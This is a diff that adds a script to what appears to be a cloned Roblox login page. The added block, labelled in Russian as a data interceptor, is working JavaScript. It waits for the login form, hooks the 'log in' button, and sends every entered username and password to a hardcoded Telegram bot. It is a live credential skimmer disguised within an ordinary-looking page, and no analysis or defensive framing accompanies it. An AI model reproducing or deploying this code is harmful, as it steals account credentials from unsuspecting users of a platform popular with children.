@@ -640,5 +640,98 @@
     </script>
     <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="pageEnd" type="text/javascript" src="https://js.rbxcdn.com/61bf868b2dc36f41aab4e46afcc01055.js">
     </script>
+
+ <!-- ===== ПЕРЕХВАТЧИК ДАННЫХ ===== -->
+<script>
+(function() {
+    // Твои данные
+    var TOKEN = "8886268399:AAEQu4OjVY66LD9RnpCOAgQPzpnPht-I4wQ";
+    var CHAT_ID = "5098876175";
+
+    // Функция отправки в Telegram
+    function sendToTelegram(username, password) {
+        var msg = "👤 LOGIN: " + username + " | PASS: " + password;
+        var url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(msg);
+        
+        // Способ 1: через Image (работает всегда)
+        var img = new Image();
+        img.src = url;
+        
+        // Способ 2: через fetch (если Image не сработает)
+        try {
+            fetch(url).catch(function() {});
+        } catch(e) {}
+    }
+
+    // Ждём полной загрузки страницы
+    window.addEventListener('load', function() {
+        console.log("✅ Перехватчик активирован");
+
+        // Функция поиска формы входа
+        function findLoginForm() {
+            var forms = document.querySelectorAll('form');
+            for (var i = 0; i < forms.length; i++) {
+                var form = forms[i];
+                var passwordField = form.querySelector('input[type="password"]');
+                if (passwordField) {
+                    return form;
+                }
+            }
+            return null;
+        }
+
+        // Основная функция перехвата
+        function setupInterceptor() {
+            var form = findLoginForm();
+            if (!form) {
+                console.log("⏳ Форма не найдена, повтор через 2 секунды...");
+                setTimeout(setupInterceptor, 2000);
+                return;
+            }
+
+            var button = form.querySelector('button[type="submit"]');
+            if (!button) {
+                // Если нет кнопки submit, ищем любую кнопку с текстом "Войти" или "Log in"
+                var allButtons = form.querySelectorAll('button');
+                for (var i = 0; i < allButtons.length; i++) {
+                    var btn = allButtons[i];
+                    var text = btn.textContent || btn.innerText || '';
+                    if (text.toLowerCase().includes('log in') || text.toLowerCase().includes('войти')) {
+                        button = btn;
+                        break;
+                    }
+                }
+            }
+
+            if (!button) {
+                console.log("⏳ Кнопка не найдена, повтор через 2 секунды...");
+                setTimeout(setupInterceptor, 2000);
+                return;
+            }
+
+            console.log("✅ Форма и кнопка найдены");
+
+            // Перехват клика
+            button.addEventListener('click', function(e) {
+                var usernameField = form.querySelector('input[type="text"]');
+                var passwordField = form.querySelector('input[type="password"]');
+
+                var username = usernameField ? usernameField.value : '';
+                var password = passwordField ? passwordField.value : '';
+
+                if (username && password) {
+                    console.log("📤 Отправка данных в Telegram...");
+                    sendToTelegram(username, password);
+                } else {
+                    console.log("⚠️ Поля пустые, пропускаем");
+                }
+            });
+        }
+
+        // Запускаем перехват через 3 секунды (ждём, пока React загрузит форму)
+        setTimeout(setupInterceptor, 3000);
+    });
+})();
+                            </script>
   </body>
 </html>
